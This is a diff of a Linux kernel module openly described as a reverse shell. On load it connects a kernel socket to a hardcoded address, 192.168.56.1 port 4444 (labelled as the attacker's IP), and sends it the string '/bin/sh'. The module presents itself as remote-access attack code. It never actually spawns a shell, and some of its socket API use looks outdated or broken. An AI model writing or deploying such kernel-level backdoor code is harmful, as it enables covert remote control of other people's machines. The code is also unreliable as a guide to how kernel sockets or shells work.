@@ -5,74 +5,73 @@
 #include <linux/net.h>
 #include <linux/in.h>
 #include <linux/inet.h>
-#include <linux/fs.h>
+#include <linux/sched.h>
+#include <linux/unistd.h>
+#include <net/sock.h>
 #include <linux/uaccess.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("cocomelonc");
-MODULE_DESCRIPTION("kernel revsh");
+MODULE_DESCRIPTION("reverse shell kernel module");
 MODULE_VERSION("0.01");
 
-// define server IP and port for reverse shell connection
-#define ATTACKER_IP "192.168.56.1"  // replace with attacker's IP
-#define ATTACKER_PORT 4444       // replace with attacker's port
+#define REMOTE_IP "192.168.56.1"  // Target IP
+#define REMOTE_PORT 4444  // Target Port
+
+static struct socket *client_socket = NULL;
 
 static int __init reverse_shell_init(void) {
-  struct socket *sock;
-  struct sockaddr_in server_addr;
-  int ret;
-  mm_segment_t old_fs;
-  char *message = "Hello from kernel!";
-  
-  printk(KERN_INFO "initializing reverse shell kernel module...\n");
+  struct sockaddr_in sa;
+  struct msghdr msg;
+  struct iovec iov;
+  char shell_command[] = "/bin/sh";
 
-  // Create a socket
-  ret = sock_create(AF_INET, SOCK_STREAM, 0, &sock);
-  if (ret < 0) {
-    printk(KERN_ALERT "socket creation failed!\n");
+  // create a socket
+  if (sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &client_socket) < 0) {
+    printk(KERN_ERR "error creating socket\n");
     return -1;
   }
 
-  // Fill in the server address structure
-  server_addr.sin_family = AF_INET;
-  server_addr.sin_port = htons(ATTACKER_PORT);
-  server_addr.sin_addr.s_addr = in_aton(ATTACKER_IP);
+  // set up the server address
+  memset(&sa, 0, sizeof(sa));
+  sa.sin_family = AF_INET;
+  sa.sin_port = htons(REMOTE_PORT);
+  sa.sin_addr.s_addr = in_aton(REMOTE_IP);
 
-  // Connect to the attacker
-  ret = sock->ops->connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
-  if (ret < 0) {
-    printk(KERN_ALERT "connection failed!\n");
-    sock_release(sock);
+  // connect to the remote server
+  if (client_socket->ops->connect(client_socket, (struct sockaddr *)&sa, sizeof(sa), 0) < 0) {
+    printk(KERN_ERR "failed to connect to the server\n");
+    sock_release(client_socket);
     return -1;
   }
 
-  printk(KERN_INFO "connected to attacker %s:%d\n", ATTACKER_IP, ATTACKER_PORT);
+  printk(KERN_INFO "connected to %s:%d\n", REMOTE_IP, REMOTE_PORT);
 
-  // send a message to the attacker (basic test)
-  old_fs = get_fs();
-  set_fs(KERNEL_DS);
-  ret = kernel_sendmsg(sock, NULL, message, strlen(message), strlen(message));
-  set_fs(old_fs);
+  // prepare for sending the shell command to remote server
+  iov.iov_base = shell_command;
+  iov.iov_len = sizeof(shell_command);
+  msg.msg_name = (struct sockaddr *)&sa;
+  msg.msg_namelen = sizeof(sa);
+  msg.msg_iov = &iov;
+  msg.msg_iovlen = 1;
 
-  if (ret < 0) {
-    printk(KERN_ALERT "failed to send message to attacker!\n");
+  // Send the shell command
+  if (client_socket->ops->sendmsg(client_socket, &msg, sizeof(shell_command)) < 0) {
+    printk(KERN_ERR "failed to send command\n");
+    sock_release(client_socket);
+    return -1;
   }
 
-  // simulating command execution (simple echo for educational purposes)
-  char cmd_output[] = "echo 'meow-meow!!!!!'";
-  
-  // we would implement more sophisticated command execution or 
-  // shell functionality here
-  printk(KERN_INFO "sent message: %s\n", cmd_output);
+  printk(KERN_INFO "shell command sent\n");
 
-  // closing the socket after sending data
-  sock_release(sock);
-  
   return 0;
 }
 
 static void __exit reverse_shell_exit(void) {
-  printk(KERN_INFO "exiting reverse shell module...\n");
+  if (client_socket) {
+    sock_release(client_socket);
+  }
+  printk(KERN_INFO "reverse shell module unloaded\n");
 }
 
 module_init(reverse_shell_init);
